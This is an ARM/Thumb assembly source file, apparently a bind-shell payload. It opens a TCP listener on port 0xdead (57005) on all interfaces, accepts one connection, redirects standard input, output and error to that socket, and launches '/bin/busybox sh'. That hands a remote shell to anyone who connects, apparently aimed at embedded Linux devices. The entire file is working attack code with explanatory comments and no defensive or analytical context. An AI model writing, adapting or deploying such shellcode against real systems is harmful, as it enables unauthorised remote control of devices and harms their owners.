.section .text
.global _start
    _start:
    .ARM
    add r3, pc, #1         // switch to thumb mode 
    bx r3

    .THUMB
// socket(2, 1, 0)
    mov r0, #2
    mov r1, #1
    sub r2, r2, r2      // set r2 to null
    mov r7, #200        // r7 = 281 (socket)
    add r7, #81         // r7 value needs to be split 
    svc #1              // r0 = host_sockid value
    mov r4, r0          // save host_sockid in r4

// bind(r0, &sockaddr, 16)
    ldr r1, =struct_addr
    mov r2, #16          // struct address length
    add r7, #1           // r7 = 282 (bind) 
    svc #1
    nop

// listen(sockfd, 0) 
    mov r0, r4           // set r0 to saved host_sockid
    mov r1, #2        
    add r7, #2           // r7 = 284 (listen syscall number) 
    svc #1        

// accept(sockfd, NULL, NULL); 
    mov r0, r4           // set r0 to saved host_sockid
    sub r1, r1, r1       // set r1 to null
    sub r2, r2, r2       // set r2 to null
    add r7, #1           // r7 = 284+1 = 285 (accept syscall)
    svc #1               // r0 = client_sockid value
    push {r0}
//    mov r4, r0           // save new client_sockid value to r4  

// close(sockfd);
    mov r0, r4		 // r0 = close listening socket
    mov r7, #6           // r7 = 6 (close syscall number) 
    svc #1               // r0 = client_sockid value

    pop {r4}

// dup2(sockfd, 0) 
    mov r7, #63         // r7 = 63 (dup2 syscall number) 
    mov r0, r4          // r4 is the saved client_sockid 
    sub r1, r1, r1      // r1 = 0 (stdin) 
    svc #1

// dup2(sockfd, 1)
    mov r0, r4          // r4 is the saved client_sockid 
    add r1, #1          // r1 = 1 (stdout) 
    svc #1

// dup2(sockfd, 2) 
    mov r0, r4          // r4 is the saved client_sockid
    add r1, #1          // r1 = 2 (stderr) 
    svc #1

// execve("/bin/sh", 0, 0) 
    ldr r0, =command    // r0 = command
#   add r1, sp, #4      // r1 = argv
    ldr r1, =args       // r1 = argv
    add r1, r1, #4
    add r2, sp, #8      // r2 = envp
    
    mov r7, #11         // execve syscall number
    svc #1
    nop

struct_addr:
	.ascii "\x02\x00" // AF_INET
	.ascii "\xde\xad" // port number
	.byte 0,0,0,0

command:
	.string "/bin/busybox"

sh:
	.string "sh"

args:
	.word command
	.word sh
	.word 0
